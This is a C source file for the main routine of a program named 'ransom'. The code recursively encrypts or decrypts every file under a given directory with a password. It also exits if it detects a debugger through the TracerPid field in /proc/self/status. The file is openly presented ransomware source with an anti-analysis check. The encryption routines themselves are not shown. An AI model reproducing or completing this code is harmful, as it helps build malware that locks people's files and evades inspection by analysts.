#include "ransom.h"
#include <fcntl.h>
#include <ctype.h>
#include <stdlib.h>

static int help(int ret, int fd)
{
    dprintf(fd, "./ransom [options] [Directory path] [password]\n"
                 "-e\t\tencryption\n"
                 "-d\t\tdecryption\n"
                 "-h\t\thelp\n");
    return ret;
}

static int check_parameters(const char *path, const char *password)
{
    if (strlen(password) > MAX_KEY_LEN) {
        dprintf(STDERR_FILENO, "Error: password must be %d characters long.",
                MAX_KEY_LEN);
        exit(1);
    } else if (strlen(path) > MAX_FILEPATH) {
        dprintf(STDERR_FILENO, "Error: path must be %d characters long.",
                MAX_FILEPATH);
        exit(1);
    }
    return EXIT_SUCCESS;
}


bool debugger_is_attached(void)
{
    char buf[4096];

    const int status_fd = open("/proc/self/status", O_RDONLY);
    if (status_fd == -1)
        return false;

    const ssize_t num_read = read(status_fd, buf, sizeof(buf) - 1);
    if (num_read <= 0)
        return false;

    buf[num_read] = '\0';
    const char tracer_pid[] = "TracerPid:";
    const char *tracer_pid_ptr = strstr(buf, tracer_pid);
    if (!tracer_pid_ptr)
        return false;

    for (const char* char_ptr = tracer_pid_ptr + sizeof(tracer_pid) - 1; char_ptr <= buf + num_read; ++char_ptr)
    {
        if (isspace(*char_ptr))
            continue;
        else return isdigit(*char_ptr) != 0 && *char_ptr != '0';
    }

    return false;
}

int main(int ac, char **av)
{
    cryptalgo_t algo;

    if (debugger_is_attached())
        exit(EXIT_FAILURE);
    if (!strcmp(av[1], "-h"))
        return help(EXIT_SUCCESS, STDOUT_FILENO);
    if (ac != 4)
        return help(EXIT_FAILURE, STDERR_FILENO);
    check_parameters(av[2], av[3]);
    if (strlen(av[1]) == 2 && av[1][0] == '-') {
        switch (av[1][1]) {
            case 'e': algo = cryptalgo[ENCRYPT]; break;
            case 'd': algo = cryptalgo[DECRYPT]; break;
            default: dprintf(STDERR_FILENO, "%s: Unrecognized option.\n", av[1]);
                     return help(EXIT_FAILURE, STDERR_FILENO);
        }
        return iter_recursively_through_files(av[2], av[3], algo);
    }
    dprintf(STDERR_FILENO, "Error: %s: must be an option.", av[1]);
    return help(EXIT_FAILURE, STDERR_FILENO);
}
